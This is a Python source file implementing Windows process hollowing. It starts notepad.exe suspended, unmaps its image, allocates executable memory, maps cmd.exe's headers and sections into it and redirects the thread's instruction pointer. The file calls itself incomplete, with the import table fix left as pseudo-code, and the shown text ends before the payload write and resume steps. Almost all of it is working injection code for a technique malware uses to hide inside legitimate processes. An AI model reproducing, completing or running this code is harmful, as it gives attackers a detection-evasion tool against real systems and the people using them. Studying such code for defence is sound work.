"""
(prod) Process Hollowing Injection
- arch: x64 process on x64 systems / 64-bit / PE32+
- target: notepad.exe
- payload: cmd.exe


Note: this technique does NOT work with shellcode
- Windows loader expects PE file structure at base address


Status: Incomplete - not fully functional
-----------------------------------------
- IAT fix needed -> logic described in fix_iat_for_hollowing()
- causes STATUS_DLL_INIT_FAILED errors (0xc0000142)

- previous Access Violation Exceptions (0xc0000005) appear resolved
- likely due to misaligned CONTEXT64 struct
- and/or Rip/Rsp not being 16-byte aligned in memory


Steps:
------
- Create SUSPENDED process                     -> CreateProcessW()
- Unmap (hollow) process memory                -> NtUnmapViewOfSection()
- Re-allocated hollowed memory                 -> VirtualAllocEx()
- Write payload into allocated memory          -> WriteProcessMemory()
- Do stuff...
- Resume original thread                       -> ResumeThread()
"""

import ctypes
from ctypes import wintypes
import msvcrt
import struct


kernel32    = ctypes.WinDLL('kernel32.dll', use_last_error=True)
ntdll       = ctypes.WinDLL('ntdll.dll',    use_last_error=True)


# ----------------------------------
# Payloads - sample(s)
# ----------------------------------

payload = r"c:\windows\system32\cmd.exe"




# ----------------------------------
# CONSTANTS - functions
# ----------------------------------

# specify Target Process to hollow/hijack
TARGET_PROCESS = r"c:\windows\system32\notepad.exe"

# CreateProcessW() - samples
CREATE_NO_WINDOW    = 0x08000000
DETACHED_PROCESS    = 0x08
CREATE_SUSPENDED    = 0x04

# CONTEXT64() struct
CONTEXT_ALL     = 0x10001f 
CONTEXT_CONTROL = 0x100001 

# NtQueryInformationProcess()
STATUS_MASK = 0xFFFFFFFF

# NtUnmapViewOfSection() - signed long values, for returned error codes
STATUS_SUCCESS                  = 0
STATUS_INVALID_HANDLE           = -1073741816
STATUS_INVALID_PARAMETER        = -1073741811
STATUS_NOT_MAPPED_VIEW          = -1073741799   # ref base address
STATUS_ACCESS_DENIED            = -1073741790
STATUS_PROCESS_IS_TERMINATING   = -1073741558
STATUS_INVALID_ADDRESS          = -1073741503

# ReadProcessMemory() - parsing PEB
IMAGE_BASE_OFFSET = 0x10

# VirtualAllocEx() / VirtualProtectEx ()
MEM_COMMIT              = 0x1000
MEM_RESERVE             = 0x2000
PAGE_NOACCESS           = 0x01
PAGE_READONLY           = 0x02
PAGE_READWRITE          = 0x04
PAGE_WRITECOPY          = 0x08
PAGE_EXECUTE            = 0x10
PAGE_EXECUTE_READ       = 0x20
PAGE_EXECUTE_READWRITE  = 0x40
PAGE_EXECUTE_WRITECOPY  = 0x80


# ----------------------------------
# CONSTANTS - PE file layout
# ----------------------------------

# For ease of parsing PE headers, given known field offsets and values

# ----- DOS e_lfanew offset ----- ptr to start of PE Header
PE_OFFSET                   = 0x3C  # 4 bytes

# ----- PE Signature ----- 
PE_SIGNATURE_SIZE           = 4

# ----- IMAGE_FILE_HEADER ----- 
FILE_HDR_SIZE               = 20

FILE_HDR_MACHINE            = 0x00  # 2 bytes
FILE_HDR_NUM_SECTIONS       = 0x02  # 2 bytes
FILE_HDR_TIMESTAMP          = 0x04  # 4 bytes
FILE_HDR_PTR_SYMBOL_TABLE   = 0x08  # 4 bytes
FILE_HDR_NUM_SYMBOLS        = 0x0C  # 4 bytes
FILE_HDR_SIZE_OF_OPT_HDR    = 0x10  # 2 bytes
FILE_HDR_CHARACTERISTICS    = 0x12  # 2 bytes

# ----- IMAGE_OPTIONAL_HEADER (samples) ----- 
OPT_HDR_MAGIC               = 0x00  # 2 bytes
OPT_HDR_ENTRY_POINT         = 0x10  # 4 bytes, Relative Virtual Address (RVA) of entry point
OPT_HDR_IMAGE_BASE          = 0x18  # 8 bytes 
OPT_HDR_SIZE_OF_IMAGE       = 0x38  # 4 bytes
OPT_HDR_SIZE_OF_HEADERS     = 0x3C  # 4 bytes

# ----- OPT_DATA DIRECTORIES ----- 
OPT_HDR_DATA_DIRECTORIES    = 0x78
DATA_DIRECTORY_SIZE         = 8     # 8 bytes, total size for one entry
NUM_DATA_DIRECTORIES        = 16

# ----- OPT_DATA DIRECTORY SUB-FIELDS ----- 
# offsets relative to each entry (below)
DATA_DIR_VIRTUAL_ADDRESS    = 0x00  # 4 bytes
DATA_DIR_SIZE               = 0x04  # 4 bytes

# ----- OPT_DATA DIRECTORY INDICES -----
DIR_EXPORT                  = 0
DIR_IMPORT                  = 1
DIR_RESOURCE                = 2
DIR_EXCEPTION               = 3
DIR_SECURITY                = 4
DIR_BASERELOC               = 5
DIR_DEBUG                   = 6
DIR_ARCHITECTURE            = 7
DIR_GLOBALPTR               = 8
DIR_TLS                     = 9
DIR_LOAD_CONFIG             = 10
DIR_BOUND_IMPORT            = 11
DIR_IAT                     = 12
DIR_DELAY_IMPORT            = 13
DIR_COM_DESCRIPTOR          = 14


# ----- IMAGE_SECTION_HEADER ----- 
SECTION_HEADER_SIZE = 40            # 40 byte header size

SEC_HDR_NAME                = 0x00  # 8 bytes
SEC_HDR_VIRTUAL_SIZE        = 0x08  # 4 bytes
SEC_HDR_VIRTUAL_ADDRESS     = 0x0C  # 4 bytes
SEC_HDR_SIZE_OF_RAW_DATA    = 0x10  # 4 bytes
SEC_HDR_PTR_TO_RAW_DATA     = 0x14  # 4 bytes
SEC_HDR_PTR_TO_RELOC        = 0x18  # 4 bytes
SEC_HDR_LINENO_PTR          = 0x1C  # 4 bytes  
SEC_HDR_RELOC_COUNT         = 0x20  # 2 bytes  
SEC_HDR_LINENO_COUNT        = 0x22  # 2 bytes  
SEC_HDR_CHARACTERISTICS     = 0x24  # 4 bytes




# ----------------------------------
# Struct Definitions
# ----------------------------------

class SECURITY_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ("nLength",                 wintypes.DWORD),
        ("lpSecurityDescriptor",    wintypes.LPVOID),
        ("bInheritHandle",          wintypes.BOOL),
    ]

class STARTUPINFOW(ctypes.Structure):
    _fields_ = [
        ("cb",                wintypes.DWORD),
        ("lpReserved",        wintypes.LPWSTR),
        ("lpDesktop",         wintypes.LPWSTR),
        ("lpTitle",           wintypes.LPWSTR),
        ("dwX",               wintypes.DWORD),
        ("dwY",               wintypes.DWORD),
        ("dwXSize",           wintypes.DWORD),
        ("dwYSize",           wintypes.DWORD),
        ("dwXCountChars",     wintypes.DWORD),
        ("dwYCountChars",     wintypes.DWORD),
        ("dwFillAttribute",   wintypes.DWORD),
        ("dwFlags",           wintypes.DWORD),
        ("wShowWindow",       wintypes.WORD),
        ("cbReserved2",       wintypes.WORD),
        ("lpReserved2",       wintypes.LPBYTE),
        ("hStdInput",         wintypes.HANDLE),
        ("hStdOutput",        wintypes.HANDLE),
        ("hStdError",         wintypes.HANDLE),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess",    wintypes.HANDLE),
        ("hThread",     wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId",  wintypes.DWORD),    
    ]

# for querying Process Environment Block
# - PebBaseAddress required for parsing memory of a process
# - 48 bytes in size -> passed in ctypes.sizeof(pbi)

class PROCESS_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
    ("ExitStatus",                  ctypes.c_void_p),
    ("PebBaseAddress",              ctypes.c_void_p),
    ("AffinityMask",                ctypes.c_void_p),
    ("BasePriority",                ctypes.c_void_p),
    ("UniqueProcessId",             ctypes.c_void_p),
    ("InheritedFromUniqueProcessId",ctypes.c_void_p),
    ]

# for CONTEXT64 struct
class M128A(ctypes.Structure):
    _pack_ = 16
    _fields_ = [
        ("Low", ctypes.c_uint64),
        ("High", ctypes.c_int64),
    ]

# Used to store CPU register data, for a given thread
# - struct required to be of specific length/size
# - and registers at specific offsets
# - otherwise, padding required to ensure fields exist on 16-byte boundaries
#
# Function to confirm above, created for this reason
# - debug_cpu_registers()

class CONTEXT64(ctypes.Structure):
    _pack_ = 16
    _fields_ = [
        # Home Addresses (48 bytes)
        ("P1Home", ctypes.c_uint64), ("P2Home", ctypes.c_uint64),
        ("P3Home", ctypes.c_uint64), ("P4Home", ctypes.c_uint64),
        ("P5Home", ctypes.c_uint64), ("P6Home", ctypes.c_uint64),
        
        ("ContextFlags", wintypes.DWORD),
        ("MxCsr", wintypes.DWORD),
        
        ("SegCs", wintypes.WORD), ("SegDs", wintypes.WORD),
        ("SegEs", wintypes.WORD), ("SegFs", wintypes.WORD),
        ("SegGs", wintypes.WORD), ("SegSs", wintypes.WORD),
        ("EFlags", wintypes.DWORD),
        
        # Padding to force Dr0 to offset 80
        ("Padding", wintypes.DWORD), 
        
        ("Dr0", ctypes.c_uint64), ("Dr1", ctypes.c_uint64), 
        ("Dr2", ctypes.c_uint64), ("Dr3", ctypes.c_uint64), 
        ("Dr6", ctypes.c_uint64), ("Dr7", ctypes.c_uint64),
        
        # Integer Registers (Rax at 128)
        ("Rax", ctypes.c_uint64), ("Rcx", ctypes.c_uint64), 
        ("Rdx", ctypes.c_uint64), ("Rbx", ctypes.c_uint64),
        ("Rsp", ctypes.c_uint64), ("Rbp", ctypes.c_uint64),
        ("Rsi", ctypes.c_uint64), ("Rdi", ctypes.c_uint64),
        ("R8",  ctypes.c_uint64), ("R9",  ctypes.c_uint64), 
        ("R10", ctypes.c_uint64), ("R11", ctypes.c_uint64),
        ("R12", ctypes.c_uint64), ("R13", ctypes.c_uint64), 
        ("R14", ctypes.c_uint64), ("R15", ctypes.c_uint64), 
        
        # Padding to force Instruction Pointer (RIP) to 264
        ("AlignPadding2", ctypes.c_uint64),
        
        ("Rip", ctypes.c_uint64), 
        
        # Floating point (512 bytes)
        ("FltSave", M128A * 32),
        
        # Vector registers
        # - *n modified to 25 here, no code requirement for below registers
        # - no need to be COMPLETELY accurate here-on
        ("VectorRegister", M128A * 25),
        ("VectorControl", ctypes.c_uint64),

        ("DebugControl", ctypes.c_uint64),
        ("LastBranchToRip", ctypes.c_uint64),
        ("LastBranchFromRip", ctypes.c_uint64),
        ("LastExceptionToRip", ctypes.c_uint64),
        ("LastExceptionFromRip", ctypes.c_uint64),
    ]




# ----------------------------------
# Function Prototypes
# ----------------------------------

# ------------------- kernel32.dll -------------------
kernel32.CloseHandle.argtypes = [ wintypes.HANDLE, ]  # hObject
kernel32.CloseHandle.restype = wintypes.BOOL


kernel32.CreateProcessW.argtypes =[
    wintypes.LPCWSTR,                       # lpApplicationName (opt)
    wintypes.LPWSTR,                        # [i/o] lpCommandLine (opt)
    ctypes.POINTER(SECURITY_ATTRIBUTES),    # lpProcessAttributes (opt)
    ctypes.POINTER(SECURITY_ATTRIBUTES),    # lpThreadAttributes (opt)
    wintypes.BOOL,                          # bInheritHandles
    wintypes.DWORD,                         # dwCreationFlags
    ctypes.c_void_p,                        # lpEnvironment (opt)
    wintypes.LPCWSTR,                       # lpCurrentDirectory (opt)
    ctypes.POINTER(STARTUPINFOW),           # lpStartupInfo
    ctypes.POINTER(PROCESS_INFORMATION),    # [o] lpProcessInformation
]
kernel32.CreateProcessW.restype = wintypes.BOOL


kernel32.GetThreadContext.argtypes = [
    wintypes.HANDLE,                    # hThread
    ctypes.POINTER(CONTEXT64),          # lpContext
]
kernel32.GetThreadContext.restype = wintypes.BOOL


kernel32.ReadProcessMemory.argtypes = [
    wintypes.HANDLE,                    # hProcess
    wintypes.LPCVOID,                   # lpBaseAddress
    wintypes.LPVOID,                    # [o] lpBuffer
    ctypes.c_size_t,                    # nSize
    ctypes.POINTER(ctypes.c_size_t),    # [o] lpNumberOfBytesRead
]
kernel32.ReadProcessMemory.restype = wintypes.BOOL


kernel32.SetThreadContext.argtypes = [
    wintypes.HANDLE,            # hThread
    ctypes.POINTER(CONTEXT64),  # *lpContext
]
kernel32.SetThreadContext.restype = wintypes.BOOL


kernel32.VirtualAllocEx.argtypes = [
    wintypes.HANDLE,        # hProcess
    wintypes.LPVOID,        # lpAddress (opt) (can be null)
    ctypes.c_size_t,        # dwSize
    wintypes.DWORD,         # flAllocationType
    wintypes.DWORD,         # flProtect
]
kernel32.VirtualAllocEx.restype = ctypes.c_void_p


kernel32.VirtualProtectEx.argtypes = [
    wintypes.HANDLE,                    # hProcess
    wintypes.LPVOID,                    # lpAddress
    ctypes.c_size_t,                    # dwSize
    wintypes.DWORD,                     # flNewProtect (see CONSTANTS)
    ctypes.POINTER(wintypes.DWORD),     # [o] lpflOldProtect
]
kernel32.VirtualProtectEx.restype = wintypes.BOOL


kernel32.WriteProcessMemory.argtypes = [
    wintypes.HANDLE,                    # hProcess
    wintypes.LPVOID,                    # lpBaseAddress
    wintypes.LPCVOID,                   # lpBuffer
    ctypes.c_size_t,                    # nSize
    ctypes.POINTER(ctypes.c_size_t),    # [o] *lpNumberOfBytesWritten
]
kernel32.WriteProcessMemory.restype = wintypes.BOOL


# ------------------- ntdll.dll -------------------
ntdll.NtQueryInformationProcess.argtypes = [
        wintypes.HANDLE,                # ProcessHandle
        ctypes.c_int,                   # ProcessInformationClass
        ctypes.c_void_p,                # [o] ProcessInformation
        ctypes.c_ulong,                 # ProcessInformationLength
        ctypes.POINTER(ctypes.c_ulong), # [o] ReturnLength (opt)
]
ntdll.NtQueryInformationProcess.restype = ctypes.c_long


ntdll.NtUnmapViewOfSection.argtypes = [
    wintypes.HANDLE,        # ProcessHandle
    ctypes.c_void_p,        # BaseAddress (opt)
]
ntdll.NtUnmapViewOfSection.restype = ctypes.c_long




# ----------------------------------
# Function Definitions
# ----------------------------------


# --------------- PE parser helper functions ---------------
#
# [DOS Header: e_lfanew] ---\    [DOS Stub]   /--> [PE Header]
#                            \_ _ _ _ _ _ _ _/
#
# e_lfanew ->   [PE Signature       - 4 bytes]
#               [File Header        - 20 bytes]
#               [Optional Header    - variable]
#               [Section Table      - no Sections x 40bytes]

def get_pe_header_offset(f: object) -> int:
    f.seek(PE_OFFSET)
    return struct.unpack('<I', f.read(4))[0]

def get_file_header_offset(pe_offset: int) -> int:
    return pe_offset + PE_SIGNATURE_SIZE

def get_optional_header_offset(pe_offset: int) -> int:
    return pe_offset + PE_SIGNATURE_SIZE + FILE_HDR_SIZE

def get_section_table_offset(pe_offset: int, size_of_optional_header: int) -> int:
    return pe_offset + PE_SIGNATURE_SIZE + FILE_HDR_SIZE + size_of_optional_header


def get_oep_rva(payload: str) -> int:
    """ 
    Return the OEP_RVA of the binary, ON-DISK
    - Original Entry Point, Relative Virtual Address
    - ie, AddressOfEntryPoint field, within Optional Header
    - NOT an absolute address -> RELATIVE to the image base

    To get address of entrypoint, IN MEMORY
    - entry_point_va = img_base_addr + oep_rva
    """

    print(f"\n[+] Extracting Original Entry Point, Relative Virtual Address:")
    print(f"    -> Payload: {payload}")

    with open(payload, 'rb') as f:
        pe_offset = get_pe_header_offset(f)
        opt_hdr_offset = get_optional_header_offset(pe_offset)
        f.seek(opt_hdr_offset + OPT_HDR_ENTRY_POINT)

        oep_rva = struct.unpack('<I', f.read(4))[0]
        print(f"    -> oep_rva: {hex(oep_rva)}")

    return oep_rva


def fix_iat_for_hollowing():
    """ Pseudo-Code here """
    
    # Parse Import Directory
    # - Payload -> Optional Header -> DataDirectory entry for Imports
    # 
    # Iterate through DLLs
    # - foreach IMAGE_IMPORT_DESCRIPTOR, extract DLL name (eg kernel32.dll)
    #
    # Load DLL locally
    # - use LoadLibraryA in injector
    # - system DLLs map to same address across processes
    # - so address found in injector, will be valid in target
    #
    # Resolve Function Addresses
    # - iterate through Thunk Data (function list)
    # - foreach function, call GetProcAddress() to get absolute memory address
    #
    # Overwrite Remote IAT
    # - use WriteProcessMemory to patch the resolved absolute address
    # - into the FirstThunk (actual IAT) in target process
    

# --------------- Misc helper functions ---------------

def winerr() -> OSError:
    """ Return a ctypes.WinError() with the last Windows API error """

    return ctypes.WinError(ctypes.get_last_error())


def close_handle(handle: wintypes.HANDLE, name: str="Handle") -> None:
    """ Close open handles, to avoid resource leaks """

    print(f"[+] Closing Handle {handle.value} to {name}: ", end='', flush=True)

    if handle is None or handle.value == 0:
        print(f"[!] Warning: {name} is None or invalid, nothing to close")
        return

    if not kernel32.CloseHandle(handle):
        print(f"Failed! Error: {winerr()}")
    else:
        print(f"Successful")


def pause(warning=False) -> None:
    """ Pause until user key press (any) """

    if warning:
        print("\n\n[!] WARNING: About to execute payload: ResumeThread()")
        print("Press any key to continue...", end='', flush=True)
    else:
        print("\n\nPress any key to continue...", end='', flush=True)

    msvcrt.getch()
    print()


def print_hdr(hdr: str) -> None:
    border = "-" * len(hdr.strip())
    print(f"\n{border}{hdr}{border}")


def debug_cpu_registers() -> None:
    """
    CONTEXT64() struct used to hold a snapshot of a thread's processor state
    - here we debug to confirm proper struct size and register offsets
    - if numbers do NOT match expectations, then padding in STRUCT def are REQUIRED
    - due to persistent 0xc000000005 Access Violation errors when calling ResumeThread()
    """
    
    print(f"\n[+] DEBUG: CONTEXT64() struct and CPU register offset info:")
    print(f"    -> Struct size: {ctypes.sizeof(CONTEXT64)} (Expected: 1232)")
    print(f"    -> Dr0 Offset: {CONTEXT64.Dr0.offset} (Expected: 80 or 96)")
    print(f"    -> Rax Offset: {CONTEXT64.Rax.offset} (Expected: 128 or 144)")
    print(f"    -> Rip Offset: {CONTEXT64.Rip.offset} (Expected: 264)")

    pause()


# --------------- Create SUSPENDED Process ---------------


def create_process(
    app: str=TARGET_PROCESS,
    flags: int=CREATE_SUSPENDED
) -> tuple[wintypes.HANDLE, wintypes.HANDLE,
           wintypes.DWORD, wintypes.DWORD]:

    """ 
    Create process in SUSPENDED state (default)
    - return HANDLEs and Ids to thread/process
    """

    hdr = "\n >>>>    Creating SUSPENDED Process -> CreateProcessW()    <<<<\n"
    print_hdr(hdr)

    # define args
    lpApplicationName = app
    lpCommandLine = None
    lpProcessAttributes = None
    lpThreadAttributes = None
    bInheritHandles = False
    dwCreationFlags = flags
    lpEnvironment = None
    lpCurrentDirectory = None

    lpStartupInfo = STARTUPINFOW()
    lpStartupInfo.cb = ctypes.sizeof(STARTUPINFOW)
    lpProcessInformation = PROCESS_INFORMATION()

    # spawn process
    try:
        if not kernel32.CreateProcessW(
            lpApplicationName,
            lpCommandLine,
            lpProcessAttributes, 
            lpThreadAttributes, 
            bInheritHandles, 
            dwCreationFlags, 
            lpEnvironment, 
            lpCurrentDirectory, 
            ctypes.byref(lpStartupInfo), 
            ctypes.byref(lpProcessInformation)
        ):
            raise winerr()

        print(f"-> Process created: {lpApplicationName}")
        
        # return handles/Ids to thread and process
        # NOTE: probably don't need to return everything here...
        hThread = wintypes.HANDLE(lpProcessInformation.hThread)
        hProcess = wintypes.HANDLE(lpProcessInformation.hProcess)  
        dwThreadId = lpProcessInformation.dwThreadId
        dwProcessId = lpProcessInformation.dwProcessId
        
        return hThread, hProcess, dwThreadId, dwProcessId
        
    except OSError as e:
        raise OSError(f"\n[!] CreateProcessW() Failed, Application: {app}, Error: {e}")


# --------------- Gathering Process Information ---------------


def get_img_base_addr(hProcess: wintypes.HANDLE) -> ctypes.c_void_p:

    """
    Return the ImageBaseAddress (from PEB)
    - this field contains the virtual address in memory, where .exe file loaded
    - functions, variables etc inside program, are all located at specific offsets relative to this address
    - this value is required to navigate process' memory -> read PE header, find entry point etc

    Step 1:
    - call NtQueryInformationProcess() <- PBI struct populated
    
    Step 2:
    - from PBI struct, query PebBaseAddress variable
    - PebBaseAddress is a pointer to where PEB starts in memory
    - at offset 0x10 (from PebBaseAddress), sits ImageBaseAddress
    - read PEB at PebBaseAddress + OFFSET <- ReadProcessMemory()

    Glossary
    - PBI, Process Basic Information (struct)
    - PEB, Process Environment Block (struct)
    """

    # Step 1: populate PBI struct
    print(f"\n[+] Retrieving Process Basic Information: NtQueryInformationProcess()")

    pbi = PROCESS_BASIC_INFORMATION()
    pi_len = ctypes.c_ulong()
    ProcessInformationClass = 0 # return ProcessBasicInformation

    status = ntdll.NtQueryInformationProcess(
        hProcess,
        ProcessInformationClass, 
        ctypes.byref(pbi),
        ctypes.sizeof(pbi),
        ctypes.byref(pi_len)
    )
    
    if status != 0:
        print(f"[!] Failed to query process info: {hex(status & STATUS_MASK)}")
        raise winerr()
    
    print(f"    -> PBI retrieved...")


    # Step 2: query PebBaseAddress
    print(f"\n[+] Parsing PEB to retrieve Image Base Address: ReadProcessMemory()")

    image_base = ctypes.c_void_p()      # buffer to populate


    if not kernel32.ReadProcessMemory(
        hProcess,
        pbi.PebBaseAddress + IMAGE_BASE_OFFSET, # lpBaseAddress
        ctypes.byref(image_base),               # [o] lpBuffer
        ctypes.sizeof(image_base),
        None
    ):
        raise winerr()

    print(f"    -> img_base_addr: {hex(image_base.value)}")

    return image_base.value


# --------------- Calculating Entry Point ---------------


def get_entry_point_va(img_base_addr: int, oep_rva: int) -> int:
    """ Return the Entry Point of the application, IN MEMORY """

    entry_point_va = img_base_addr + oep_rva

    print(f"\n[+] Re-using existing Entry Point at: {hex(entry_point_va)}")
    print(f"    -> entry_point_va = img_base_addr + oep_rva")

    print(f"\n\n[+] NOTE: above memory address \"entry_point_va\", will have the following:")
    print(" -> Payload written to here\n -> Instruction Pointer redirected to here\n")

    return entry_point_va


# --------------- Memory Manipulation ---------------


def hollow_process(
            hProcess: wintypes.HANDLE,
            base_address: ctypes.c_void_p
) -> None:
    """ Unmap ('hollow out') the memory address space of target process """

    print(f"\n[+] Un-mapping process memory -> NtUnmapViewOfSection()")

    status = ntdll.NtUnmapViewOfSection(hProcess, base_address)

    if status != 0:
        print(f"[!] Failed, Status Code: {status}")
        raise winerr()
        
    print(f"    -> Successful, hollowed-out target memory at: {hex(base_address)}")




def get_size_of_payload(payload: str) -> int:
    """
    Retrieve SizeOfImage -> memory size (bytes) that must be reserved/committed to load payload
    - including all sections in Section Table
    - footprint of file in virtual memory, NOT the file size on disk
    - ie SizeOfImage > SizeOfFileOnDisk
    - field exists within Optional Header, @ 56-byte (0x38) offset
    """

    with open(payload, 'rb') as f:

        # 1. Jump to end of DOS header (0x3C), read last field 'e_lfanew'
        pe_offset = get_pe_header_offset(f)

        # 2. Jump to start of Optional Header
        opt_hdr_offset = get_optional_header_offset(pe_offset)
        
        # 3. SizeOfImage at Offset 56 within Optional Header
        size_of_image_offset = opt_hdr_offset + OPT_HDR_SIZE_OF_IMAGE
        
        f.seek(size_of_image_offset)
        size_of_image = struct.unpack('<I', f.read(4))[0]
        
        return size_of_image
    



def virtual_alloc_ex(
    hProcess: wintypes.HANDLE,
    lpAddress: ctypes.c_void_p,
    dwSize: ctypes.c_size_t
) -> wintypes.LPVOID:

    """
    Allocate memory space in suspended process
    - returns pointer to allocated memory, in remote process
    
    Requesting allocation address same as img_base_addr
    - if not available, ptr= assignment should fail and error out
    """

    hdr = "\n>>>>    Allocating Memory -> VirtualAllocEx()    <<<<\n"
    print("\n" + "-" *len(hdr) + hdr + "-" *len(hdr))
    
    ptr = kernel32.VirtualAllocEx(hProcess,
                            lpAddress,
                            dwSize,
                            MEM_COMMIT | MEM_RESERVE,
                            PAGE_EXECUTE_READWRITE) # red flag but fine for PoC

    if not ptr:
        raise winerr()
    
    print(f"    -> Successful, base address: {hex(ptr)}")
    is_equal = True if hex(ptr) == hex(lpAddress) else False
    print(f"    [INFO] Was requested address granted: {is_equal}")
    
    return ptr




def write_payload(
    hProcess: wintypes.HANDLE,
    lpBaseAddress: wintypes.LPVOID,
    payload: str) -> None:
    
    """
    (PE File)
    ---------
    Manually parsing PE file on disk (eg cmd.exe)
    - writing/mapping headers and sections, based on known PE file structure -> offsets and byte-lengths
    
    Minimise offset math with raw numbers
    ie, instead of  -> opt_header_offset = pe_offset + 4 + 20
    use following   -> opt_header_offset = pe_offset + PE_SIGNATURE_SIZE + FILE_HDR_SIZE
        [PE Signature       - 4 bytes]
        [File Header        - 20 bytes]
        [Optional Header    - variable]
        [Section Table      - no Sections x 40bytes]
    """

    with open(payload, 'rb') as f:

        # 1. Get all header offsets
        pe_offset           = get_pe_header_offset(f)               # 1 
        file_header_offset  = get_file_header_offset(pe_offset)     # 2
        opt_hdr_offset      = get_optional_header_offset(pe_offset) # 3

        f.seek(file_header_offset + FILE_HDR_SIZE_OF_OPT_HDR)
        size_of_opt_header = struct.unpack('<H', f.read(2))[0]
        section_table_offset = get_section_table_offset(pe_offset, size_of_opt_header) #4


        # Headers - map/write
        f.seek(opt_hdr_offset + OPT_HDR_SIZE_OF_HEADERS)
        size_of_headers = struct.unpack('<I', f.read(4))[0]

        f.seek(0)
        header_data = f.read(size_of_headers)
        bytes_written = ctypes.c_size_t(0)
        
        print(f"\n[+] Writing Header Information: WriteProcessMemory()")
        
        if not kernel32.WriteProcessMemory(
            hProcess, 
            ctypes.c_void_p(lpBaseAddress), 
            header_data, 
            size_of_headers, 
            ctypes.byref(bytes_written)    # lpNumberOfBytesWritten (optional)
        ):
            raise winerr()

        print(f"    -> Headers written: {bytes_written.value} bytes")

        
        print()

        # Section Table - map/write
        # - the Section Table, is an array of Section Headers
        # - section[S] will include .text, .data, .rsrc, .reloc etc

        f.seek(file_header_offset + FILE_HDR_NUM_SECTIONS) # NumberOfSections
        num_sections = struct.unpack('<H', f.read(2))[0]
        
        for i in range(num_sections):

            # iterate through each Section Header in the Section Table[]
            entry_offset = section_table_offset + (i * SECTION_HEADER_SIZE)
            
            # read name of the section (.data, .text etc)
            f.seek(entry_offset)
            name_bytes = f.read(8)
            section_name = name_bytes.split(b'\x00')[0].decode(errors='ignore')
            
            # read VirtualAddress, RawDataSize and RawDataPointer info (Offsets 12, 16, 20)
            # virt_addr -> where section will be loaded into target-process' virtual memory
            # raw_size  -> size of raw data (how much data to copy)
            # raw_ptr   -> offset within file, where section's raw data begins
            
            f.seek(entry_offset + SEC_HDR_VIRTUAL_ADDRESS)
            virt_addr, raw_size, raw_ptr = struct.unpack('<III', f.read(12))
            
            
            # actual mapping of section -> target process' memory
            # raw data (@ raw_ptr) read from disk -> written to allocated memory of target process
            if raw_size > 0:
                # jump to the code/data on disk
                f.seek(raw_ptr)
                section_bytes = f.read(raw_size)
                
                # Destination = Target Base + Virtual Off   set
                dest = lpBaseAddress + virt_addr
                
                if not kernel32.WriteProcessMemory(
                    hProcess, 
                    ctypes.c_void_p(dest), 
                    section_bytes, 
                    raw_size, 
                    None    # lpNumberOfBytesWritten (optional)
                ):
                    raise winerr()

                print(f"Mapped section {section_name:10} -> {hex(dest)} (size: {hex(raw_size)})")


# --------------- Execution Redirection ---------------


def redirect_to_payload(
        hThread: wintypes.HANDLE,
        entry_point_va: int
) -> None:

    """
    Retrieve CPU-register info for target hThread
    - re-direct Instruction Pointer (Rip) to new entry point
    """

    # ensure CONTEXT64 struct is 16-byte aligned in memory
    # - previous script iterations caused 0xc0000005 Access Violation errors...
    # - here, forcing 16-byte alignment (something something SSE instructions)

    # Below, force CONTEXT64 16-byte boundry alignment
    #
    # Steps:
    # - allocate extra 16 bytes to give wiggle room
    # 
    # at aligned_addr:
    # - move into next boundry (+ 0xF, or 15 decimal)
    # - apply bitmask to zero-out last 4 bits -> 0 (~15, as 15 decimal = 1111 binary)
    # - binary value that ends in 0000 is divisible by 16 -> eg 1011 0000
    
    raw_buffer = ctypes.create_string_buffer(ctypes.sizeof(CONTEXT64) + 16)
    raw_addr = ctypes.addressof(raw_buffer)
    aligned_addr = (raw_addr + 0xF) & ~0xF
    
    # map struct onto above specific memory address
    ctx = CONTEXT64.from_address(aligned_addr)
    ctx.ContextFlags = CONTEXT_ALL # 0x10001f




    # retrieve information on CPU registers    
    print(f"\n[+] Reading current state of CPU-registers for thread: GetThreadContext()")

    if not kernel32.GetThreadContext(hThread, ctypes.byref(ctx)):
        raise winerr()

    # old v new Rip
    print(f"    -> Original Instruction Pointer: {hex(ctx.Rip)}")
    ctx.Rip = entry_point_va
    print(f"    -> New Instruction Pointer:      {hex(ctx.Rip)}")


    # ensure Stack Pointer (Rsp) is also 16-byte aligned     
    # - additionally, add 'shadow space' (-0x20, or 32 decimal)
    # - this reserves extra space on stack to save and restore register values from function calls
    print(f"\n[+] Adjusting Stack Pointer Alignment:")

    # old v new
    print(f"    -> Old Rsp: {hex(ctx.Rsp)}")
    ctx.Rsp = (ctx.Rsp & ~0xF) - 0x20  # Align and add "Shadow Space"
    print(f"    -> New Rsp (Aligned): {hex(ctx.Rsp)}")


    # apply changes
    print(f"\n[+] Redirecting Instruction Pointer to new entrypoint: SetThreadContext()")
    if not kernel32.SetThreadContext(hThread, ctypes.byref(ctx)):
        raise winerr()
    print(f"    -> Successful")


# --------------- Execution ---------------


def resume_orig_process(
    hThread: wintypes.HANDLE,
    dwThreadId: wintypes.DWORD,
    dwProcessId: wintypes.DWORD
) -> None:
    
    """ Resume execution of original process/thread """

    print(f"\n[+] Resuming original thread:")
    print(f"    -> ProcessId: {dwProcessId}")
    print(f"    -> ThreadId: {dwThreadId}")
    
    kernel32.ResumeThread(hThread)




##########################################
##### Main functionality starts here #####
##########################################

# show state of CPU registers and struct info
debug_cpu_registers()

# create target process <- return handle/Ids to thread/process
hThread, hProcess, dwThreadId, dwProcessId = create_process()




# ------------------------------------------------------
hdr = "\n >>>>    Phase: Gathering Process Information    <<<<\n"
print_hdr(hdr)

# return base address, of where target process is loaded
img_base_addr = get_img_base_addr(hProcess)




# ------------------------------------------------------
hdr = "\n >>>>    Phase: Calculating Entry Point    <<<<\n"
print_hdr(hdr)

# calculate various entry points - for payload (on disk, in memory)
payload_oep_rva = get_oep_rva(payload)
payload_entry_point_va = get_entry_point_va(img_base_addr, payload_oep_rva)




# ------------------------------------------------------
hdr = "\n >>>>    Phase: Memory Manipulation    <<<<\n"
print_hdr(hdr)

# hollow out target process
hollow_process(hProcess, img_base_addr)

# retrieve SizeOfImage for payload
size_of_payload = get_size_of_payload(payload)

# allocate memory at same hollowed-out base
# - given wrapper, if we can't re-assign img_base_addr, a winerr() is raised
lpBaseAddress = virtual_alloc_ex(hProcess, img_base_addr, size_of_payload)

# write payload into allocated memory
